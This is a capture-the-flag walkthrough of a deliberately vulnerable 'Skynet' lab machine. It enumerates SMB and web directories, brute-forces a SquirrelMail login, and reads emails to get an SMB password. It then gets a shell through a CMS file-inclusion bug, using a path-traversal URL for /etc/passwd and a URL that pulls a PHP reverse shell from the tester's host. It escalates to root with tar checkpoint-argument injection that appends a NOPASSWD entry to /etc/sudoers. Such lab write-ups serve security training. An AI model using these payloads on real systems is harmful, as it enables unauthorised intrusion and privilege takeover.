![image](https://user-images.githubusercontent.com/99112106/174288113-e8634912-7fed-4dab-9e6b-598cd9c767b1.png)

# Skynet

## 1.Enumeration 

Let's start with a simple nmap scan:

```
nmap -sV -sC -oA nmap/Skynet 10.10.160.60
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 22:44 CEST
Nmap scan report for 10.10.160.60
Host is up (0.037s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL SASL CAPA TOP AUTH-RESP-CODE RESP-CODES PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID capabilities LOGINDISABLEDA0001 have OK post-login listed more IMAP4rev1 IDLE Pre-login LITERAL+ ENABLE LOGIN-REFERRALS SASL-IR
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
| smb-security-mode:  
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-07T20:44:22
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-04-07T15:44:22-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds

```

So it seems we have several open ports like; ssh, apache, pop3 , netbios, imap and smb!!

* * *
## 2.Enumerating SMB

Let's start this box by enumerating SMB with the following command:

```
enum4linux -a 10.10.160.60 
```

After a while running, we managed to list some usernames:

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1001 Unix User\milesdyson (Local User)                                                                     

[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''        
                                                                                                                    
S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                            
S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)

```

We also discovered an interesting shared directory called "anonymous":

```
[+] Attempting to map shares on 10.10.160.60                                                                        
                                                                                                                    
//10.10.160.60/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                   
//10.10.160.60/anonymous        Mapping: OK Listing: OK Writing: N/A
//10.10.160.60/milesdyson       Mapping: DENIED Listing: N/A Writing: N/A
```

We have access to it so let's check inside that shared directory:

![image](https://user-images.githubusercontent.com/99112106/174288150-d840337f-9315-4f6c-964d-0e31e07dc487.png)

We have found a txt file and 3 log files. Let's retrieve them all so we can analyze them. So the text file says the following:

![image](https://user-images.githubusercontent.com/99112106/174288162-fe305a7b-ba2e-4698-ac64-2e80b8b24453.png)

So we have an user we saw before while enumerating SMB, "Miles Dyson", talking about reseting all passwords for all the system users... Interesting.

We also pulled out from the shared directory 3 log files. One of them, "log1.txt" looks like a wordlist we can later user .

![image](https://user-images.githubusercontent.com/99112106/174288185-c93b0a9e-a328-4bdb-8f06-a282e9ff167a.png)

I tried to use this wordlist to brute force my way into SMB with "milesdyson" user but it didn't work:

![image](https://user-images.githubusercontent.com/99112106/174288215-52d5c5d4-2a80-4c22-9a42-cc57e38acce9.png)

I also tried to brute force my way in via SSH, but it didn't work. What a mess ~

![image](https://user-images.githubusercontent.com/99112106/174288222-c9e4cea2-bc7f-4a41-9137-1ab902d180bb.png)

Okay, let's move on.

* * *
## 3.Enumerating hidden directories

Let's going to list some hidden directories with Gobuster:

```
gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://10.10.160.60         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/07 22:45:09 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.160.60/admin/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.160.60/ai/]   
/config               (Status: 301) [Size: 313] [--> http://10.10.160.60/config/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.160.60/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.10.160.60/js/]    
/server-status        (Status: 403) [Size: 277]                                  
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.160.60/squirrelmail/]
                                                                                       
===============================================================
2022/04/07 22:46:23 Finished
===============================================================
```

* * *

## 4.Squirrelmail
Okay, we found a squirrelmail login page!! That's nice:

![image](https://user-images.githubusercontent.com/99112106/174288244-04fb4391-844c-4759-b26c-5b49204bc5e5.png)

We can try to bruteforce our way in again. We need to make an attempt to login and get the POST url. We'll need this:

![image](https://user-images.githubusercontent.com/99112106/174288254-c10e5091-4c36-498e-ab39-9b128817c00f.png)

Let's get Hydra working:

![image](https://user-images.githubusercontent.com/99112106/174288276-432142ac-365e-4975-831f-ff0621f60ffb.png)

Yes! We bruteforced it!! Let's login into "milesdyson" email account:

![image](https://user-images.githubusercontent.com/99112106/174288307-913c4855-f9e8-4217-b7ad-400e381b3812.png)

Okay, once we're in, we can see three email from "serenakogan" and "skynet". I guess "skynet" is the admin account. Let's read the emails:

![image](https://user-images.githubusercontent.com/99112106/174288321-b3863457-0588-403a-9cea-4117bdb6b78f.png)

What a password!! Okay, we have the new SMB password for "milesdyson"!

* * *
## 5.Foothold

Let's login into SMB with "milesdyson" account:

![image](https://user-images.githubusercontent.com/99112106/174288339-e799800c-8940-4eb9-8f84-e84f4690af5e.png)

We have a bunch of .pdf files and a "notes" directory. Inside it we also have a bunch of .md files and a text file called "important.txt". 

![image](https://user-images.githubusercontent.com/99112106/174288351-cef5f703-0a50-4ca8-bc92-1cabce3501b0.png)

Let's read that file:

![image](https://user-images.githubusercontent.com/99112106/174288364-9b362d0f-0cb1-41c3-a14e-0f50a891ffe8.png)

Is that a directory name? ....

![image](https://user-images.githubusercontent.com/99112106/174288549-d090987d-bd29-4539-b35f-c27a7ebc4b58.png)

It is... xd After checking the source code, I decided to run again Gobuster:

```
gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://10.10.160.60/45kra24zxs28v3yd
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.60/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/07 23:37:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/administrator        (Status: 301) [Size: 337] [--> http://10.10.160.60/45kra24zxs28v3yd/administrator/]
                                                                                                         
===============================================================
2022/04/07 23:39:04 Finished
===============================================================
```

Nice! We haven an administrator directory!! Let's visit it:

![image](https://user-images.githubusercontent.com/99112106/174288587-34223ef4-f10c-4a63-9c97-ec565c31f3ea.png)

* * *
## 6. Remote File Inclusion

Mmmmm we don't have any clue about admin's account so let's find another attack vector. Let's check if the  CMS has some known vulnerabilities that we can take advantage of. 

![image](https://user-images.githubusercontent.com/99112106/174288602-db1e8390-9044-4c97-a6e0-ef4d3c5e26c0.png)

Only one... Let's read the exploit:

![image](https://user-images.githubusercontent.com/99112106/174288617-d18ded2b-54f0-4ba0-b81b-357af51ab4fb.png)
![image](https://user-images.githubusercontent.com/99112106/174288630-6af00e8e-b499-4500-9b9e-7ec442bf6b16.png)

So basically we can include local or remote php files or even read non-PHP files. So let's try if it works by trying to read the "/etc/passwd" file. Using the following url:

```
http://10.10.160.60/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

We managed to retrieve the content of the file, so the exploit works! =)

![image](https://user-images.githubusercontent.com/99112106/174288643-44b3a12e-db2e-4249-8a8b-7f2bb2c78d72.png)

Okay, let's create a simple php script in order to execute a Remote File Inclusion:

![image](https://user-images.githubusercontent.com/99112106/174288659-5257ae4e-0563-4e52-99ff-6857b18f2702.png)

This should work fine... Set up a listenning port:

![image](https://user-images.githubusercontent.com/99112106/174288674-b3d90b9e-e781-423d-a662-c76599f72f74.png)

Now we need to put and python http server up in the air on the directory where we have our php reverse shell:

![image](https://user-images.githubusercontent.com/99112106/174288684-52a6bb2c-059f-4820-987f-5f2a8de1413e.png)

The url we're going to use is the following:

```
http://10.10.160.60/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.33.218/exploit
```

Once we run it on the web server, we recieved the request on our python http server:

![image](https://user-images.githubusercontent.com/99112106/174288700-b93e5aad-f44b-4af1-9247-267f2bcb63aa.png)

And a reverse shell should be opened on our side:

![image](https://user-images.githubusercontent.com/99112106/174288711-89c24262-ef17-4d4c-8e72-cda7ad905900.png)

Now we can pull out the user flag! =)

![image](https://user-images.githubusercontent.com/99112106/174288717-2dd23574-5d96-4e76-a866-bf9d246f43c5.png)

* * *

## 7.Privileges Escalation

Let's start our way to root! We discovered that there is a cron job running every minute which runs a milesdyson's script:

![image](https://user-images.githubusercontent.com/99112106/174288742-9de00d56-4bee-4e1a-990d-938433150cd0.png)

Let's have a look on that script:

![image](https://user-images.githubusercontent.com/99112106/174288763-7c092781-4c94-4496-983d-160a2e56e61e.png)

Okay, we can read and execute it but we can't write it. This backup script runs as root, changes directory to "/var/www/html" and then uses tar to compress the content of the directory into a file called "backup.tgz".

So if we read about tar in GTFOBins, we find this:

![image](https://user-images.githubusercontent.com/99112106/174288777-e4f972c8-81ae-4fe3-9435-7f4551c5c96b.png)

By forcing tar to use these options, we can use a especific action with the permissions of the user is running the command, which in our case is root. So let's modify things a little bit and create a simple script which adds www-data to the sudoers file:

```
echo ‘echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers’ > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"
```

Run this commands under "/var/www/html" directory because is where the root's script will be executed. Once done, wait a minute and change user to root:

![image](https://user-images.githubusercontent.com/99112106/174288795-51f00f2c-2ec3-438d-b9d3-385e8bc0c9aa.png)

We're root! Congratz.
